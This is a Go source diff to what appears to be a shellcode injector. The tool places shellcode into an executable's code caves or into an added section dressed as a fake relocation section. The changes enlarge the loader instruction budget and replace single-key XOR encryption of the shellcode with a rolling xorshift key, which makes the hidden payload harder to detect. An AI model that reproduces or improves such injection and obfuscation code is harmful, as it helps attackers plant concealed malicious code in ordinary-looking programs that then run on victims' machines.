@@ -21,6 +21,11 @@ import (
 // add edi, 4              add rdi, 8
 const numInstForCopyShellcode = 4
 
+const (
+	maxNumLoaderInstX86 = 350
+	maxNumLoaderInstX64 = 250
+)
+
 // just for prevent [import _ "embed"] :)
 var _ embed.FS
 
@@ -419,10 +424,12 @@ func (inj *Injector) selectReadMode(ctx *loaderCtx, sc []byte, src string) (stri
 	switch inj.arch {
 	case "386":
 		numCaves = (len(sc)/4 + 1) * numInstForCopyShellcode
+		numCaves += maxNumLoaderInstX86
 	case "amd64":
 		numCaves = (len(sc)/8 + 1) * numInstForCopyShellcode
+		numCaves += maxNumLoaderInstX64
 	}
-	if minNumCaves+numCaves > len(inj.caves) {
+	if numCaves > len(inj.caves) {
 		if inj.opts.ForceCodeCave {
 			return "", errors.New("shellcode is too large and extend section is disabled")
 		}
@@ -476,6 +483,7 @@ func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string)
 		for i := 0; i < len(sc); i += 4 {
 			val := binary.LittleEndian.Uint32(sc[i:])
 			binary.LittleEndian.PutUint32(encrypted[i:], val^key)
+			key = xorShift32(key)
 		}
 	case "amd64":
 		key := inj.rand.Uint64()
@@ -483,6 +491,7 @@ func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string)
 		for i := 0; i < len(sc); i += 8 {
 			val := binary.LittleEndian.Uint64(sc[i:])
 			binary.LittleEndian.PutUint64(encrypted[i:], val^key)
+			key = xorShift64(key)
 		}
 	}
 	// build a fake relocate section data
@@ -516,6 +525,20 @@ func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string)
 	ctx.SectionOffset = inj.extendSection(section.Bytes())
 	// remove the flag in assembly source
 	return strings.ReplaceAll(src, "{{STUB CodeCaveMode STUB}}", "")
+}
+
+func xorShift32(seed uint32) uint32 {
+	seed ^= seed << 13
+	seed ^= seed >> 17
+	seed ^= seed << 5
+	return seed
+}
+
+func xorShift64(seed uint64) uint64 {
+	seed ^= seed << 13
+	seed ^= seed >> 7
+	seed ^= seed << 17
+	return seed
 }
 
 func toUTF16(s string) string {
